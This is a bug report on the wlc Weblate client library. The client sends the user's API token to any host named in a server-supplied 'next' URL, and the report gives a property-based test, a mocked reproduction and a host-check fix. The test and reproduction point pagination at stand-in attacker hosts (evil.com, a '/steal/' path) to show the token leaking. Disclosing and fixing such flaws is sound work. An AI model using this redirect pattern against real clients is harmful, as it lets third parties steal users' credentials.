# Bug Report: wlc.Weblate.invoke_request Sends the API token to any absolute URL the server returns

**Target**: `wlc.Weblate.invoke_request` / `list_factory`
**Severity**: Medium
**Bug Type**: Logic
**Date**: 2026-10-06

## Summary

`list_factory` follows the server-supplied `next` URL (and other server-supplied URLs such as `repository_url`). `invoke_request` adds `Authorization: Token <key>` to every request, whatever its host. A response with `"next": "https://other-host/..."` therefore sends the user's API key to a third party.

## Property-Based Test

```python
@given(st.from_regex(r"[a-z]{1,10}\.(com|org|net)", fullmatch=True))
def test_token_only_sent_to_configured_server(evil):
    w = wlc.Weblate(key="SECRET", url="https://weblate.example/api/")
    sent = []
    def fake_request(method, url, **kw):
        sent.append((url, kw["headers"].get("Authorization")))
        r = mock.Mock(status_code=200)
        r.raise_for_status = lambda: None
        r.json = lambda: {"results": [], "next": None} if evil in url else {"results": [], "next": f"https://{evil}/steal/"}
        return r
    w.session.request = fake_request
    list(w.list_projects())
    for url, auth in sent:
        if not url.startswith("https://weblate.example/"):
            assert auth is None
```

**Failing input**: `evil='a.com'`. The request to `https://a.com/steal/` carries `Token SECRET`.

## Reproducing the Bug

```python
from unittest import mock
import wlc

w = wlc.Weblate(key="SECRET", url="https://weblate.example/api/")
def fake_request(method, url, **kw):
    print(url, kw["headers"].get("Authorization"))
    r = mock.Mock(status_code=200)
    r.json = lambda: {"results": [], "next": None if "evil" in url else "https://evil.com/x"}
    return r
w.session.request = fake_request
list(w.list_projects())
# https://evil.com/x Token SECRET
```

## Why This Is A Bug

The key is configured per server URL (`[keys]` section keyed by URL in `WeblateConfig.get_url_key`), so it is meant only for that server. Sending it to any host that appears in a response leaks the credential.

## Fix

Only attach the `Authorization` header when the request URL has the same scheme and host as `self.url`, for example:

```diff
-        if self.key:
+        base, target = urlparse(self.url), urlparse(path)
+        if self.key and (target.scheme, target.netloc) == (base.scheme, base.netloc):
             headers["Authorization"] = f"Token {self.key}"
```
